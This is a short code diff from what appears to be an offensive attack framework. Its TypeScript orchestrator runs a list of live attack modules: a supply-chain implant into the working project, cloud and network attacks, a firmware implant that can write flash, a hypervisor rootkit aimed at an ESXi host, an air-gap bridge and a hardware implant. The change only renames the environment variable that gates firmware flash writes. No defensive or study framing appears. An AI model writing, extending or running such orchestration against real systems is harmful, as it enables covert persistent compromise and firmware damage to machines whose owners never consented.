@@ -61,7 +61,7 @@ export async function runAresOrchestrator(opts: {
     { name: "ares_supply_chain_implant", run: async () => { const r = await runSupplyChainImplant({ live: true, projectDir: opts.projectDir ?? process.cwd() }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
     { name: "ares_cloud_native", run: async () => { const r = await runCloudNativeAttack({ live: true }); return { summary: r.summary, success: r.steps.some((s) => s.success) || r.platforms.length > 0 } } },
     { name: "ares_network_exploit", run: async () => { const r = await runNetworkExploit({ live: true }); return { summary: r.summary, success: r.steps.some((s) => s.success) } } },
-    { name: "ares_firmware_implant", run: async () => { const r = await deployFirmwareImplant({ live: true, flashWrite: process.env.OURMINE_LAB_FLASH_WRITE === "1" }); return { summary: r.summary, success: r.deployed || !!r.uefiDriver } } },
+    { name: "ares_firmware_implant", run: async () => { const r = await deployFirmwareImplant({ live: true, flashWrite: process.env.OURMINE_ALLOW_FLASH_WRITE === "1" }); return { summary: r.summary, success: r.deployed || !!r.uefiDriver } } },
     { name: "ares_hypervisor_rootkit", run: async () => { const r = await deployHypervisorRootkit({ live: true, esxiHost: target }); return { summary: r.summary, success: r.deployed || r.steps.some((s) => s.success) } } },
     { name: "ares_airgap_bridge", run: async () => { const r = await runAirgapBridge({ live: true }); return { summary: r.summary, success: r.executed || r.channels.length > 0 } } },
     { name: "ares_hardware_implant", run: async () => { const r = await deployHardwareImplant({ live: true }); return { summary: r.summary, success: r.probed || r.artifacts.length > 0 } } },
